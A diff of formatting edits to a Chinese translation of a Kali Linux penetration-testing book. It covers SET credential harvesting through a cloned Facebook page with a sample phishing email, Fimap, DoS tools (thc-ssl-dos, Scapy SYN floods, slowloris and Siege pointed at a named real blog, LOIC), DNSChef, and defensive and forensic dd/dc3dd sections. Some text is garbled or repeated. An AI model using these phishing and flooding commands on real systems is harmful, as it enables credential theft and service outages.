+我们将使用 `SET` 来收割密码。`SET` 有能力克隆你想要的网站。在示例中，我们实际上选择了流行的网站之一进行克隆。
 
 # 第 6 章
 
 ```
 root@kali:~ ~
+
 File Edit Search Terminal
+
 此软件，即使已告知可能导致损坏
 ```
 
@@ -4325,21 +4365,17 @@ File Edit Search Terminal
 
 你同意服务条款吗 [y/n]:
 
-
-
-
-
 ## Web 攻击
 
-对于我们的示例，我们将选择 Web 模板。SET 将询问它应该在哪个 IP 地址上监听。这将是 Kali Linux 上接口的 IP 地址。例外情况是在防火墙上使用 NAT。在这种情况下，你需要使用 NAT 或公网地址，而不是 Kali Linux 上的 IP 地址，以便目标能够访问该系统。接下来的示例将使用本地回环地址 127.0.0.1。
+对于我们的示例，我们将选择 Web 模板。`SET` 将询问它应该在哪个 IP 地址上监听。这将是 Kali Linux 上接口的 IP 地址。例外情况是在防火墙上使用 NAT。在这种情况下，你需要使用 NAT 或公网地址，而不是 Kali Linux 上的 IP 地址，以便目标能够访问该系统。接下来的示例将使用本地回环地址 `127.0.0.1`。
 
-接下来，SET 将要求选择一个模板。对于此示例，我们将选择 Facebook。
+接下来，`SET` 将要求选择一个模板。对于此示例，我们将选择 Facebook。
 
-接下来的示例显示 Web 浏览器访问 127.0.0.1 并显示一个虚假的 Facebook 页面。如果模板页面看起来不恰对，你可能想要使用不同的模板或清除默认模板。
+接下来的示例显示 Web 浏览器访问 `127.0.0.1` 并显示一个虚假的 Facebook 页面。如果模板页面看起来不恰对，你可能想要使用不同的模板或清除默认模板。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_249_0.png)
 
-我们注意到地址栏显示为 127.0.0.1。通常情况下，你需要使用其他攻击向量来欺骗用户访问你的网站。有许多方法可以实现这一点，例如发送链接或虚假页面：
+我们注意到地址栏显示为 `127.0.0.1`。通常情况下，你需要使用其他攻击向量来欺骗用户访问你的网站。有许多方法可以实现这一点，例如发送链接或虚假页面：
 
 > Facebook <wwt.secmob@gmail.com>
 致: A Lakhani <Aamir.Lakhani@wwt.com>
@@ -4349,7 +4385,7 @@ Facebook
 
 亲爱的 Facebook：
 为了确保您的在线体验更安全、更愉快，Facebook 将实施一套新的登录系统，该系统将影响所有 Facebook 用户。这些更改将提供新功能并提高账户安全性。
-在在使用新的登录系统之前，您被要求更新您的账户。
+在使用新的登录系统之前，您被要求更新您的账户。
 请点击下方链接现在在线更新您的账户
 www.facebook.com
 如果您有任何问题，请参考《新用户指南》。
@@ -4360,33 +4396,49 @@ Facebook 永远不会在电子邮件或 Facebook 信息中向您索要密码。�
 
 ## 第6 章
 
-当我们在虚假的 Facebook 中输入用户名时，SET 会捕获流量。SET 还会将用户重定向到真实网站。希望受害者认为他们在被重定向到真实 Facebook 时输入了密码，并继续使用 Facebook，而不知道 SET 捕获了他们的登录凭据：
+当我们在虚假的 Facebook 中输入用户名时，`SET` 会捕获流量。`SET` 还会将用户重定向到真实网站。希望受害者认为他们在被重定向到真实 Facebook 时输入了密码，并继续使用 Facebook，而不知道 `SET` 捕获了他们的登录凭据：
 
 ```
 root@kali:~ -
+
 File Edit View Search Terminal Help
+
 [*] Cloning the website: http://www.facebook.com
+
 [*] This could take a little bit...
 
 使用这种攻击的最好方法是如果你的用户名和密码字段可用。无论如何，这都会捕获网站上所有的 POST 请求。
+
 [*] Social-Engineer Attack
+
 [*] Credential Harvester is running on port 80
+
 [*] 信息将在到达时向您显示：
+
 127.0.0.1 - [11/Jun/2013 22:18:29] SET / HTTP/1.1 280 -
+
 127.0.0.1 - [11/Jun/2013 22:18:29] SET / HTTP/1.1 280 -
+
 [*] WE GOT A HIT! Printing the output:
+
 PARAM: charset_text='', *,\de, *,\de
+
 PARAM: location=facebook.com
+
 POSSIBLE USERNAME FIELD FOUND: non-login.com
+
 POSSIBLE PASSWORD FIELD FOUND: kali
+
 POSSIBLE PASSWORD FIELD FOUND: kali-linux-LINUX
+
 PARAM: charset_text='', *,\de, *,\de
+
 *) WHEN YOU'RE FINISHED, CONTROL-C TO GENERATE A REPORT.
 ```
 
-上一个示例显示 SET 捕获了我们的用户名：DrChaos，以及我们的密码 ILoveKali。
+上一个示例显示 `SET` 捕获了我们的用户名：DrChaos，以及我们的密码 ILoveKali。
 
-当你完成此项练习后，请按 Ctrl+C 退出 SET 工具并生成一个 HTML 报告。SET 会创建一个可以用于你的渗透测试报告的专业报告：
+当你完成此项练习后，请按 Ctrl+C 退出 `SET` 工具并生成一个 HTML 报告。`SET` 会创建一个可以用于你的渗透测试报告的专业报告：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_250_0.png)
 
@@ -4396,9 +4448,9 @@ PARAM: charset_text='', *,\de, *,\de
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_251_0.png)
 
-Fimap 是一个 Python 工具，可以针对 Web 应用程序发现、准备、审计、利用并自动搜索本地和远程文件包含（LFI 和 RFI）漏洞。
+`Fimap` 是一个 Python 工具，可以针对 Web 应用程序发现、准备、审计、利用并自动搜索本地和远程文件包含（LFI 和 RFI）漏洞。
 
-可以在 Web Applications | Web Vulnerability Scanners | Fimap 下找到 Fimap。当你打开 Fimap 时，会打开一个终端窗口。Fimap 有几个插件选项，你可以通过以下命令下载它们：
+可以在 `Web Applications` | `Web Vulnerability Scanners` | `Fimap` 下找到 `Fimap`。当你打开 `Fimap` 时，会打开一个终端窗口。`Fimap` 有几个插件选项，你可以通过以下命令下载它们：
 
 ```
 fimap --install-plugins
@@ -4408,23 +4460,39 @@ fimap --install-plugins
 
 ```
 root@kali:~# fimap --install-plugins
+
 fimap v.09 (For the Swarm)
+
 :: Automatic LFI/RFI scanner and exploiter
+```
+
+
+
+```
 :: By Iman Karim (fimap.dev@gmail.com)
+
 Requesting list of plugins...
+
 ######################################
+
 #LIST OF TRUSTED PLUGINS
+
 ######################################
+
 #[1] Weevils injector by Darren "Infmbox" Martyn <infodex@security.net> - Version 2 not installed.
+
 #[2] Do HTTP reverse shell by Darren "Infmbox" Martyn <infodex@security.net> - At version 1 not installed.
+
 #[q] Cancel and Quit.
+
 ######################################
+
 Choose a plugin to install:
 ```
 
-要使用 Fimap，你首先需要确定目标。
+要使用`Fimap`，你首先需要确定目标。
 
-## 第6 章
+## 第 6 章
 
 ### 拒绝服务 (DoS)
 
@@ -4437,52 +4505,53 @@ Kali Linux 包含了在前章节中涵盖的多个漏洞利用工具，可以用
 - 应用层攻击（Application Layer Attacks）：利用合法流量使 Web 服务崩溃。它包括零日攻击、漏洞利用等。
 - 会话耗尽（Session Exhaustion）：通过反复建立但不关闭会话来滥用会话限制，旨在消耗资源。DoS 与分布式拒绝服务（DDoS）的区别在于，DoS 攻击涉及一台机器，而 DDoS 攻击涉及许多机器。
 
-## Web 攻击
+### Web 攻击
 
-### THC-SSL-DOS
+#### THC-SSL-DOS
 
 安全套层（SSL）协议用于加密互联网上的连接和交易。建立一个安全的 SSL 连接时，服务器所需的处理能力是客户端的 15 倍。THC-SSL-DOS 通过过载服务器使其无法为合法用户提供任何服务，从而利用了这种不对对称性。该攻击利用 SSL 安全重协商功能，通过单个 TCP 连接触发成千上万次重协商。这被称为 SSL 资源耗尽攻击。这种方法的优势在于客户端端 SSL 握手的处理能力远高于服务器，这意味着一台通过普通网络连接的普通电脑就可以挑战 Web 应用程序服务器。这是一个已知的漏洞，在本文编写时，尚无真正的解决方案可以修复它。
 
-
-
-
-
-## 第 6 章
-
-要访问 THC-SSL-DOS，请导航至 Stress Testing | Web Stress Testing | thc-ssdos。这将打开一个带有 THC-SSL-DOS 主页的终端窗口。要对目标运行 THC-SSL-DOS，请输入：
+要访问 THC-SSL-DOS，请导航至 `Stress Testing | Web Stress Testing | thc-ssdos`。这将打开一个带有 THC-SSL-DOS 主页的终端窗口。要对目标运行 THC-SSL-DOS，请输入：
 
 `thc-ssl-dos [options] <ip of the victim> <port> and --accept`
 
 你必须包含 `--accept`，否则将收到以下错误消息：
+
+```
 ERROR: 请通过使用 '--accept' 选项同意该 IP 是合法目标，并且你已完全授权对该目标执行测试。
 root@kali:~
+```
 
 一旦执行了 THC-SSL-DOS，你将看到一些有趣的文字，说明它正在启动以及正在利用握手过程。在截图中，我们将展示一个没有利用 SSL 的网站；因此显示了连接错误。第二张截图显示了成功的握手，这最终会导致目标瘫痪。请记住，你应该只对你拥有测试权限的 IP 和网站尝试这样做。这些攻击可能会严重损害网站或网络应用程序：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_254_0.png)
 
+```
 等待脚本小子们来生气...
 原力与读源码的人同在
 Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
 Handshakes 0 [0.00 h/s], 3 Conn, 0 Err
 SSL: error:14070ffc:SSL routine:ss23:GET_SERVER:unknown protocol
 #10: 这看起来不像 SSL!
+```
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_254_1.png)
 
-## Web攻击
-
-## Scapy
+#### Scapy
 
 最流行的 DoS 工具之一是 Scapy。Scapy 是一个由 Philippe Biondi 用 Python 编写计算机网络包处理工具。Scapy 可以伪造或解码数据包、将其发送到网络、捕获它们并匹配请求和响应。此外，它还可以处理扫描、路由追踪、探测、单元测试、攻击和网络发现等任务。
 
 一个常用的技巧是从 Kali 操纵 TCP 包并通过 Scapy 发送。要启动 Scapy，在终端中输入 `scapy`。一旦 Scapy 启动，输入命令语法：
 
-```bash
+```
 root@kali:~# scapy
+
 INFO: Can't import python pyplot wrapper . Won't be able to plot.
+
 WARNING: No route found for IPv6 destination :: (no default route?)
+
 Welcome to Scapy (2.2.8)
+
 >>
 ```
 
@@ -4490,15 +4559,21 @@ Welcome to Scapy (2.2.8)
 
 `send(IP(dst="10.0.0.1",ttl=0)/TCP(iface="eth0",count=2000))`
 
-在上一行代码中，我们正从 Kali 服务器的 eth0 接口向目标地址 10.0.0.1 发送 2000 个包。此外，我们将目标的 TTL 存值设置为 0。从 TCP 的角度来看，这几乎是不可能的。本质上，我们正试图通过一个错误的 TTL 值来混淆 Web 服务器。需要注意的是，在适当的情况下，系统可能会因为单个错误或畸形的数据包而损坏。我们可以根据攻击需要调整计数计数器或其他参数：
+在上一行代码中，我们正从 Kali 服务器的 `eth0` 接口向目标地址 10.0.0.1 发送 2000 个包。此外，我们将目标的 TTL 存值设置为 0。从 TCP 的角度来看，这几乎是不可能的。本质上，我们正试图通过一个错误的 TTL 值来混淆 Web 服务器。需要注意的是，在适当的情况下，系统可能会因为单个错误或畸形的数据包而损坏。我们可以根据攻击需要调整计数计数器或其他参数：
 
-```bash
+```
 root@kali:~# scapy
+
 INFO: Can't import python pyplot wrapper . Won't be able to plot.
+
 WARNING: No route found for IPv6 destination :: (no default route?)
+
 Welcome to Scapy (2.2.0)
+
 >>> send(IP(dst="10.0.0.1",ttl=0)/TCP(iface="eth0",count=2000))
 ```
+
+
 
 以下是 Scapy 显示的其他攻击场景：
 
@@ -4535,25 +4610,21 @@ Welcome to Scapy (2.2.0)
 ### SYN 洪水
 `send(IP(dst="10.0.0.1")/TCP(flags="S"),iface="eth0",count=2000)`
 
-
-
-
-
 ## 第6 章
 
 Slowlor 是一种低带宽的 HTTP 客户端，可以发起 DoS 攻击。Slowlor 的独特之处在于它不使用常见的泛洪技术来攻击目标。Slowlor 通过发送不完整的 HTTP 请求来保持连接开放。它以固定间隔继续发送数百个后续请求，以防止套字关闭。这种行为将耗尽目标的资源，使其无法响应合法流量。高流量网站可能需要很长时间才能释放可用套字；其他用户必须完成请求后，套字才能释放供 Slowlor 使用。尽管如此，Slowlor 最终会占满所有可用的套字，导致受害者网站的服务中断。
 
 Slowlor 利用了使用线程处理的服务器，这意味着这些服务器容易受到线程数量限制的攻击。示例包括 Apache 1.x、2.x、dhtop、GoAhead 等。
 
-Kali Linux 未预装 Slowlor。你可以从 http://slowloris.org/ 下载 Slowlor。
+Kali Linux 未预装 Slowlor。你可以从 `http://slowloris.org/` 下载 Slowlor。
 
-要运行 Slowloris，请下载 .pl 脚本并打开终端。进入脚本所在的文件夹并输入：
+要运行 Slowloris，请下载 `.pl` 脚本并打开终端。进入脚本所在的文件夹并输入：
 
 ```bash
 perl slowloris.pl
 ```
 
-这将显示主界面。若要在目标上运行 Slowloris，请使用相同的命令后跟 -dns 和你的目标。例如，要攻击 www.thesecurityblogger.com，请输入：
+这将显示主界面。若要在目标上运行 Slowloris，请使用相同的命令后跟 `-dns` 和你的目标。例如，要攻击 `www.thesecurityblogger.com`，请输入：
 
 ```bash
 perl slowloris.pl -dns thesecurityblogger.com
@@ -4561,7 +4632,7 @@ perl slowloris.pl -dns thesecurityblogger.com
 
 ### 低轨道炮 (Low Orbit Cannon)
 
-低轨道离子炮 (LOIC) 是一种网络压力测试工具，它设计用于测试目标能够承受多少流量以满足未来的预期。该软件启发了其他软件，如 JavaScript，允许用户直接从网页浏览器进行压力测试。该软件曾被匿名组织（Anonymous）著名用于对多个知名公共实体发起 DDoS 攻击。法律观点认为，使用 LOIC 违反了计算机安全与欺诈法。
+低轨道离子炮 `LOIC` 是一种网络压力测试工具，它设计用于测试目标能够承受多少流量以满足未来的预期。该软件启发了其他软件，如 JavaScript，允许用户直接从网页浏览器进行压力测试。该软件曾被匿名组织 `Anonymous` 著名用于对多个知名公共实体发起 DDoS 攻击。法律观点认为，使用 LOIC 违反了计算机安全与欺诈法。
 
 要安装 LOIC，打开终端并输入：
 
@@ -4570,7 +4641,7 @@ apt-get update
 apt-get install git-core
 ```
 
-完成后，进入 ~/Desktop 目录并使用以下命令创建一个名为 loic 的文件夹：
+完成后，进入 `~/Desktop` 目录并使用以下命令创建一个名为 `loic` 的文件夹：
 
 ```bash
 mkdir loic
@@ -4608,7 +4679,7 @@ chmod 777 loic.sh
 
 使用 LOIC 非常简单。你可以选择使用手动模式或 IRC 模式。在接下来的示例中我们将选择手动模式。
 
-接下来，你可以选择想要泛洪的 URL 或 IP 地址。在接下来的示例中使用 IP 地址 127.0.0.1。如果你想修改 TCP 或 UDP 设置，LOIC 提供了攻击选项。
+接下来，你可以选择想要泛洪的 URL 或 IP 地址。在接下来的示例中使用 IP 地址 `127.0.0.1`。如果你想修改 TCP 或 UDP 设置，LOIC 提供了攻击选项。
 
 当你准备好发起攻击时，按下 IMMA CHARGIN MAH LAZER 按钮。LOIC 将显示攻击正在进行。点击 Stop Flooding 按钮停止攻击：
 
@@ -4618,15 +4689,11 @@ Kali Linux 提供了许多对 Web 攻击有用的工具。以下是 Kali Linux �
 
 ### DNSCHEF
 
-DNSChef 是渗透测试人员和恶意软件分析师的 DNS 代理。DNS 代理也称为“伪 DNS”，是一种应用程序网络流量分析和其他用例的工具。域名系统（DNS）是用于计算机、服务或任何连接互联网或私有网络的分布式命名系统。提供伪 DNS 地址可以将流量重定向到其他目标位置。
+DNSChef 是渗透测试人员和恶意软件分析师的 DNS 代理。DNS 代理也称为“伪 DNS”，是一种应用程序网络流量分析和其他用例的工具。域名系统 `DNS` 是用于计算机、服务或任何连接互联网或私有网络的分布式命名系统。提供伪 DNS 地址可以将流量重定向到其他目标位置。
 
 ## Web 攻击
 
-例如，DNS 代理可以用于伪造对 badguy.com 的请求，将其指向本地机器进行终止或拦截，而不是指向互联网上某处的真实主机。要实现这一点，你需要获得访问并修改单台服务器上的 DNS 词目，或者投毒真实的 DNS 以便流量到达 Kali Linux 服务器。
-
-
-
-
+例如，DNS 代理可以用于伪造对 `badguy.com` 的请求，将其指向本地机器进行终止或拦截，而不是指向互联网上某处的真实主机。要实现这一点，你需要获得访问并修改单台服务器上的 DNS 词目，或者投毒真实的 DNS 以便流量到达 Kali Linux 服务器。
 
 ## Siege
 
@@ -4636,6 +4703,7 @@ Siege 是一款 HTTP/HTTPS 测试工具，专为 Web 开发人员设计，用于
 
 ```
 SIEGE 2.70
+
 Usage: siege [options]
 sieve [options] URL
 sieve -g URL
@@ -4660,7 +4728,7 @@ Options:
 siege [options] <target URL>
 ```
 
-下面的截图显示了针对 www.thesecurityblogger.com 运行 Siege。默认用户数量为 15，如截图所示。当停止 Siege 测试时，工具将提供如下的测试后报告：
+下面的截图显示了针对 `www.thesecurityblogger.com` 运行 Siege。默认用户数量为 15，如截图所示。当停止 Siege 测试时，工具将提供如下的测试后报告：
 
 ```
 root@kali:~# siege www.thesecurityblogger.com
@@ -4668,6 +4736,8 @@ root@kali:~# siege www.thesecurityblogger.com
 ** 正在准备 15 个并发用户战斗。
 服务器现在正受到围攻..
 ```
+
+
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_264_0.png)
 
@@ -4688,8 +4758,8 @@ root@kali:~# siege www.thesecurityblogger.com
 | 最长事务 (Longest transaction): | 10.16 |
 | 最短事务 (Shortest transaction): | 1.77 |
 
-FILE: /var/log/siege.log
-你可以通过编辑家目录下的 .siegerc 文件来禁用此消息；将'show-logfile' 指改为 false。
+FILE: `/var/log/siege.log`
+你可以通过编辑家目录下的 `.siegerc` 文件来禁用此消息；将 `show-logfile` 指改为 false。
 
 ## Inundator
 
@@ -4723,10 +4793,6 @@ Kali Linux 是一款领先的渗透测试工具，可用于系统漏洞所在。
 - 测试副本还是真实系统？
 - 渗透测试的潜在风险？
 - 应该通知谁？
-
-
-
-
 
 ## 第7章
 
@@ -4786,10 +4852,6 @@ STIG 是保护操作系统、网络设备和应用程序的极佳指南。你可
 
 本书作者是 Steve Gibson 密码生成器的粉丝，并将其作为生成随机密码的方法。Steve Gibson 的安全随机密码生成器可以在 Gibson 研究中心找到网址：https://www.grc.com/passwords.htm。
 
-
-
-
-
 > 许多网站和 Web 应用之所以遭到破解，是因为开发者实施了糟糕的安全协议。Web 开发人员应该使用强加密来存储用户密码和数据。密码应采用哈希（hashing）和加盐（salting）技术，以进一步降低数据被盗或丢失带来的风险。
 
 你可以利用本书第三章“服务器端攻击”和第四章“客户端攻击”中涵盖的密码破解工具，评估你系统中使用的密码的强度。建议的工具包括 John the Ripper、Johnny、Hashcat、oclHashcat 和 Ophcrack。Crunch 和 Hashcat 也可生成密码列表，以验证你的密码策略的强度。
@@ -4812,22 +4874,39 @@ HTTrack 是一个免费的离线浏览器工具。HTTrack 允许从互联网下�
 
 会要求你提供项目名称、网站安装路径（默认是 `root/websites/`）以及要复制的 URL。HTTrack 提供了几个复制目标的选项，如截图所示。其他额外选项包括定义通配符和递归深度。我们选择了选项 2。如果你回答了问题，选择 `y` 来克隆你的目标。
 
+
+
 ```
 root@kali:~# htrack
+
 Welcome to HTTrack Website Copier (Offline Browser) 3.46+libjavascript.so.2
+
 Copyright (C) Xavier Mohr and other contributors
+
 See the option list, enter a blank line or try htrack --help
+
 Enter project name $:Shadow
+
 Base path (return=root/websites/):
+
 Enter URLs (separated by commas or blank spaces) :www.thesecurityblogger.com
+
 Action:
+
 (enter) 1 Mirror Web Site(s)
+
 2 Mirror Web Site(s) with Wizard
+
 3 Get Files Indicated
+
 4 Mirror ALL links in URLs (Multiple Mirror)
+
 5 Test Links in URLs (Bookmark Test)
+
 0 Quit
 ```
+
+
 
 HTTrack 将开始克隆你的目标及其相关链接。根据目标的大小，可能需要一些时间完成。截图显示 HTTrack 正在克隆 www.thesecurityblogger.com。
 
@@ -4851,8 +4930,8 @@ HTTrack 将开始克隆你的目标及其相关链接。根据目标的大小，
 
 Kali Linux 中还有几个网站克隆工具。再次强调，这些工具不会复制动态内容，也不会复制网站中间件（如数据库）。因此，它们可能不适用于所有的渗透测试环境。
 
-- **Webget**: 这是一个用于克隆的工具。
-- **Wget**: 这是一个从网络下载文件的命令行实用。
+- `Webget`: 这是一个用于克隆的工具。
+- `Wget`: 这是一个从网络下载文件的命令行实用。
 
 ### 中间人攻击防御
 
@@ -4860,10 +4939,6 @@ Kali Linux 中还有几个网站克隆工具。再次强调，这些工具不会
 
 - 该网站的身份无法验证
 - 你通常连接到此站点，此错误可能意味着有人正试图冒充
-
-
-
-
 
 ## 防御措施
 
@@ -4915,10 +4990,6 @@ Kali Linux 包含了许多处理取证所需的工具。取证是调查证据并
 
 第一规则是永远不要在原始数据上工作。始终使用副本。确保在创建副本时不要修改数据。一旦触碰或修改原始数据，你的案件就会变得毫无价值。无论发现了什么，被篡改的证据都无法在任何法律诉讼中使用。
 
-
-
-
-
 ## 防御性措施
 
 数字取证的最后一条关键规则是确保记录你所有的发现。为了确保结论的可信度，用于得出结论的所有证据和步骤必须易于理解。更重要的是，你的发现必须是可还原的。独立调查人员必须使用你的文档和技术得出与你相同的结论。此外，你的文档还需要建立一个事件时间线，说明特定事件发生的时间以及发生的方式。所有时间线结论都必须记录在案。
@@ -4941,27 +5012,40 @@ Kali Linux 提供使用取证启动（Forensics Boot）的选项。使用 Kali �
 
 ### 使用 Kali 进行文件系统分析
 
-dd 是 Linux/Unix 中常用的复制文件系统的工具之一。该工具用于创建文件系统的精确副本，包括删除的区域和引导区。在许多情况下，该工具用于创建外部介质或硬盘的磁盘镜像。当 dd 创建磁盘镜像时，可以在其他系统上对其进行挂载和检查。如果需要，dd 可以磁盘镜像保存到网络或 USB 驱动器上，这样取证分析师就不会接触本地文件系统。下一个示例将检查如何使用 dd 制作内部硬盘的副本。第一步是选择目标机器并使用 Live CD 以取证模式启动系统。
+`dd` 是 Linux/Unix 中常用的复制文件系统的工具之一。该工具用于创建文件系统的精确副本，包括删除的区域和引导区。在许多情况下，该工具用于创建外部介质或硬盘的磁盘镜像。当 `dd` 创建磁盘镜像时，可以在其他系统上对其进行挂载和检查。如果需要，`dd` 可以磁盘镜像保存到网络或 USB 驱动器上，这样取证分析师就不会接触本地文件系统。下一个示例将检查如何使用 `dd` 制作内部硬盘的副本。第一步是选择目标机器并使用 Live CD 以取证模式启动系统。
 
 我们将运行命令 `fdisk -l` 来查看我们正在分析的系统上的磁盘信息。
 
 ```
-root@kali:~# fdisk -l
+```
+
+
+
+`root@kali:~# fdisk -l`
+
 Disk /dev/sda: 3916 cylinders, 255 heads, 63 sectors/track
+
 Warning: extended partition does not start at a cylinder boundary.
+
 DOS and Linux 将对内容进行不同的解释。
+
 Units = cylinders of 825228 bytes, blocks of 1024 bytes, counting from 0
 
 Device Boot Start End   #cyls  #blocks Id System
-/dev/sda1      *    3751-  3752-  3010176 83 Linux
-/dev/sda2             3751-  3916-   165-  1324033 5 Extended
-/dev/sda3               0       0      Empty
-/dev/sda4               0       0      Empty
-/dev/sda5             3751-  3916-   165-  1324032 82 Linux swap / Solaris
-root@kali:~# 
-```
 
-之前的截图显示了五个分区。分区 **1、2 和 5** 似乎是最感兴趣的，因为分区 **3 和 4** 被列为可用。记住，交换分区可能包含来自用户缓存和缓存的信息。如果我们在基于 Windows 的系统上启动 Live CD，我们将看到不同的分区结构；但整体概念是相同的。
+`/dev/sda1`      *    3751-  3752-  3010176 83 Linux
+
+`/dev/sda2`             3751-  3916-   165-  1324033 5 Extended
+
+`/dev/sda3`               0       0      Empty
+
+`/dev/sda4`               0       0      Empty
+
+`/dev/sda5`             3751-  3916-   165-  1324032 82 Linux swap / Solaris
+
+`root@kali:~#`
+
+之前的截图显示了五个分区。分区 `1`、`2` 和 `5` 似乎是最感兴趣的，因为分区 `3` 和 `4` 被列为可用。记住，交换分区可能包含来自用户缓存和缓存的信息。如果我们在基于 Windows 的系统上启动 Live CD，我们将看到不同的分区结构；但整体概念是相同的。
 
 下一步是决定复制哪个分区。让我们选择上一个图像列出的第一个分区作为 `/dev/sda1`。
 
@@ -4977,13 +5061,11 @@ dd if=/media/partition on a media of=/image_file
 dd if=/dev/sda of=sda-image.dd
 ```
 
-这将创建一个镜像文件，它是 sda 分区到我们本地文件系统的精确副本。当我们写入本地文件系统时，我们违反了“不修改原始数据”的黄金法则之一（注：此处原文逻辑可能指写入本地存储而非原始磁盘）。最佳实践是将镜像文件保存到网络或 USB 驱动器，以便取证分析师不接触本地文件系统。下一个示例将检查如何使用 dd 制作内部硬盘的副本。第一步是选择目标机器并使用 Live CD 以取证模式启动。
+这将创建一个镜像文件，它是 sda 分区到我们本地文件系统的精确副本。当我们写入本地文件系统时，我们违反了“不修改原始数据”的黄金法则之一。最佳实践是将镜像文件保存到网络或 USB 驱动器，以便取证分析师不接触本地文件系统。下一个示例将检查如何使用 `dd` 制作内部硬盘的副本。第一步是选择目标机器并使用 Live CD 以取证模式启动。
 
 我们将运行 `fdisk -l` 命令来查看我们正在分析的系统上的磁盘信息。
 
-（注：此处原文后续部分存在大量逻辑重复的表述，已根据语意翻译并保持格式连贯性）
-
-之前的截图显示了五个分区。分区 **1、2 和 5** 似乎是最感兴趣的，因为分区 **3 和 4** 被列为可用。记住，交换分区可能包含来自用户缓存和缓存的信息。如果我们在基于 Windows 的系统上启动 Live CD，我们将看到不同的分区结构；但整体概念是相同的。
+之前的截图显示了五个分区。分区 `1`、`2` 和 `5` 似乎是最感兴趣的，因为分区 `3` 和 `4` 被列为可用。记住，交换分区可能包含来自用户缓存和缓存的信息。如果我们在基于 Windows 的系统上启动 Live CD，我们将看到不同的分区结构；但整体概念是相同的。
 
 下一步是决定复制哪个分区。让我们选择上一个图像列出的第一个分区作为 `/dev/sda1`。
 
@@ -5001,34 +5083,41 @@ dd if=/dev/sda of=sda-image.dd
 
 这将创建一个镜像文件，它是 sda 分区到我们本地文件系统的精确副本。最佳实践是将镜像文件保存到网络或 USB 驱动器，以便取证分析师不接触本地文件系统。
 
-下一个示例将检查如何使用 dd 制作内部硬盘的副本。第一步是选择目标机器并使用 Live CD 以取证模式启动。
+下一个示例将检查如何使用 `dd` 制作内部硬盘的副本。第一步是选择目标机器并使用 Live CD 以取证模式启动。
 
 ### dc3dd
 
-dc3dd 是增加了取证功能的 dd 工具。dc3dd 可以在复制工具和源驱动器之间计算哈希。这在证明你正在处理的数据与原始数据完全一致时至关重要。可以通过创建原始数据和副本的哈希来完成。
+`dc3dd` 是增加了取证功能的 `dd` 工具。`dc3dd` 可以在复制工具和源驱动器之间计算哈希。这在证明你正在处理的数据与原始数据完全一致时至关重要。可以通过创建原始数据和副本的哈希来完成。
 
 下一个示例中，我们将运行 `sfdisk -l` 命令来查看可用的驱动器和分区，如下所示：
 
 ```
 root@kali:~# sfdisk -l
+
 Disk /dev/sda: 3916 cylinders, 255 heads, 63 sectors/track
+
 Warning: extended partition does not start at a cylinder boundary.
+
 DOS and Linux 将对内容进行不同的解释。
+
 Units = cylinders of 822508 bytes, blocks of 1024 bytes, counting from 0
+
 Device Boot Start End #cols #blocks Id System
+
 /dev/sda * 0+ 3751- 30130176 83 Linux
+
 /dev/sda2 3751+ 3916- 165- 1324033 5 Extended
+
 /dev/sda3 0 - Empty
+
 /dev/sda4 0 - Empty
+
 /dev/sda5 3751+ 3916- 165- 1324032 82 Linux swap / Solaris
+
 root@kali:~# _
 ```
 
-`dc3dd` 命令的执行方式与 dd 工具类似。你选择源驱动器或分区作为目标来保存镜像。还有一个哈希选项。在下一个示例中，我们提取 `/dev/sda2` 分区并将其复制到名为 `CopyOfDrivedc3dd` 的镜像中，同时使用 sha256 计算哈希。
-
-
-
-
+`dc3dd` 命令的执行方式与 `dd` 工具类似。你选择源驱动器或分区作为目标来保存镜像。还有一个哈希选项。在下一个示例中，我们提取 `/dev/sda2` 分区并将其复制到名为 `CopyOfDrivedc3dd` 的镜像中，同时使用 `sha256` 计算哈希。
 
 # 防御性措施
 
@@ -5038,48 +5127,82 @@ root@kali:~# _
 root@kali:-# dc3dd if=/dev/sda2 of=/CopyofDrivedcd3dd version hash=sha256
 ```
 
-dc3dd 在完成后会为被复制的驱动器的输入文件提供一个唯一的哈希值。
+`dc3dd` 在完成后会为被复制的驱动器的输入文件提供一个唯一的哈希值。
 
 ```
 dc3dd 7.1.614 started at 2013-07-06 17:32:32 -0400
+
 compiled options:
+
 command line: dc3dd if=/dev/sda2 of=/CopyofDrivedcd3dd_version hash=sha256
+
 device size: 2 sectors (probed)
+
 sector size: 512 bytes (probed)
+
 1024 bytes (1 K) copied (100%), 0.10156 s, 9.8 K/s
+
 input results for /dev/sda2:
+
 2 sectors in
+
 0 bad sectors replaced by zeros
+
 c28635c09505425c793774a6c8e5d5e98a6b7a4cd8a9a24e6f6473d490e6b (sha256)
+
 out results for /CopyofDrivedcd3dd_version:
+
 2 sectors out
+
 completed at 2013-07-06 17:32:32 -0400
 ```
 
-证明副本的哈希与原始文件完全匹配非常重要。我们使用 `sha256sum` 命令来计算哈希。如果我们对作为硬硬盘 `/dev/sda2` 的文件 `CopyofDrivedcd3dd` 计算哈希，将看到它们是匹配的。我们可以看到 dc3dd 复制的输出也是相同的。由于哈希值匹配，我们已经确认了取证调查中的文件是完全相同的。
+证明副本的哈希与原始文件完全匹配非常重要。我们使用 `sha256sum` 命令来计算哈希。如果我们对作为硬硬盘 `/dev/sda2` 的文件 `CopyofDrivedcd3dd` 计算哈希，将看到它们是匹配的。我们可以看到 `dc3dd` 复制的输出也是相同的。由于哈希值匹配，我们已经确认了取证调查中的文件是完全相同的。
 
 ```
 dc3dd 7.1.614 started at 2013-07-06 17:32:32 -0400
+
 compiled options:
+
 command line: dc3dd if=/dev/sda2 of=/CopyofDrivedcd3dd_version hash=sha256
+
 device size: 2 sectors (probed)
+
 sector size: 512 bytes (probed)
+
 1024 bytes (1 K) copied (100%), 0.10156 s, 9.8 K/s
+
 input results for /dev/sda2:
+
 2 sectors in
+
 0 bad sectors replaced by zeros
+
 c28635c09505425c793774a6c8e5d5e98a6b7a4cd8a9a24e6f6473d490e6b (sha256)
+
 out results for /CopyofDrivedcd3dd_version:
+
 2 sectors out
+
 dc3dd completed at 2013-07-06 17:32:32 -0400
+
 root@kali:-# sha256sum /CopyofDrivedcd3dd_version
-c28635c09505425c793774a6c8e5d5e98a6b7a4cd8a9a24e6f6473d490e6b CopyofDrivedcd3dd
-version_
